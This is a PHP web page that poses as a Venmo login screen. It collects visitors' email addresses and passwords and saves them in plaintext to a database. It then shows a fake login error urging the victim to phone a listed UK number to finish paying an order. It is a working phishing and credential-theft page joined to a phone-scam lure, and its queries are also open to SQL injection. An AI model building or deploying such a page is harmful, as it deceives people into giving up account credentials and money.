<?php

include('../include/connect.php');
include('../function/common_function.php');

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Venmo Login</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background-color:rgba(97, 88, 88, 0.81); 
            text-align: center; padding: 50px;
            background-image: url('../images/pay.png');
            background-size: cover; 
            background-repeat: no-repeat;
            background-position: center; 
        }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); width: 300px; margin: auto; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        .login-btn { background: #0070ba; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
        .login-btn:hover { background: #005ea6; }
    </style>
</head>
<body>

    <div class="login-box">
        <h2>Venmo Login</h2>
        <form action="" method="POST">
    <input type="email" name="email" placeholder="Enter Email Address" required>
    <input type="password" name="password" placeholder="Enter Password" required>
    <button type="submit" name="login-btn" class="login-btn">Login</button>
</form>

    </div>

</body>
</html>

<?php

if (isset($_POST['login-btn'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Check if email exists
    $select_query = "Select * from `venmo` where email='$email' or password='$password' ";
    //$stmt = mysqli_query($con, $select_query);
    $result= mysqli_query($con, $select_query);
    $rows_count=mysqli_num_rows($result);

    if ($rows_count > 0) {
        echo "<script>alert('Email already exists')</script>";
    } else {
        // Insert new user
        $insert_query="Insert into `venmo` (email, password) values('$email', '$password') ";
        $sql_execute=mysqli_query($con, $insert_query);
        echo "<script>alert('Ooppss!!! We are having a problem in Loging into your email please contact our customer care +44 7575 887439 to help in completing payment of your order.Thank you')</script>";   
        echo "<script>window.open('profile.php', '_self')</script>";
    }
}
?>
